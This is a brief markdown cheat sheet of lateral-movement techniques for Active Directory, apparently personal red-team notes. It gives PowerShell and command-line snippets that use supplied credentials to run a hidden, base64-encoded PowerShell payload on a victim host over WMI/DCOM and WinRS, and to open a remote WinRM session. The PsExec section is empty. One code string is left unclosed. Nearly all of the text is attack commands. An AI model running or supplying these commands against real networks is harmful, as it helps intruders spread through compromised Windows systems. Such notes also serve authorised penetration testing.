# Lateral movements in AD

## WMI

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $VictimIP -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e somebase64string
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
```

## WinRs

```
winrs -r:victimhostname -u:user -p:pass  "powershell -nop -w hidden -e somebase64string"
```

## WinRM

```
$username = 'user';
$password = 'pass';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $VictimIp -Credential $credential

Enter-PSSession $winrm_session_number
```

## PsExec

```

```

